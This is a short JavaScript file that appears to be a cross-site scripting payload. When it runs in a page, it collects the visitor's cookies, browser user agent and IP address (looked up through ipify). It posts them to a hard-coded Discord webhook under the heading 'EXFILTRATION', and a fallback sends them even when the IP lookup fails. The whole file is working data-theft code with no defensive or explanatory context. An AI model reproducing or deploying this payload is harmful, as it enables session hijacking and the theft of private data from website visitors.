    function discord_message(webHookURL, message) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", webHookURL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            'content': message,
            'username':'belesnatch',
        }));
    }
	

	ip = fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
		discord_message("https://discord.com/api/webhooks/1226632634898059415/s59noDMH0twgLEIxtUf8Fbhyhv866ZLcTuNyFEkCWWkIrzKTmh7pzJ4zNPoOCv3S9MOo", "EXFILTRATION:\n	Cookie: " + document.cookie + "\n	User agent: " + navigator.userAgent + "\n	IP: " + data.ip);
    })
    .catch(error => {
			discord_message("https://discord.com/api/webhooks/1226632634898059415/s59noDMH0twgLEIxtUf8Fbhyhv866ZLcTuNyFEkCWWkIrzKTmh7pzJ4zNPoOCv3S9MOo", "EXFILTRATION:\n	Cookie: " + document.cookie + "\n	User agent: " + navigator.userAgent + "\n	IP: " + "failed");
    });
	

	
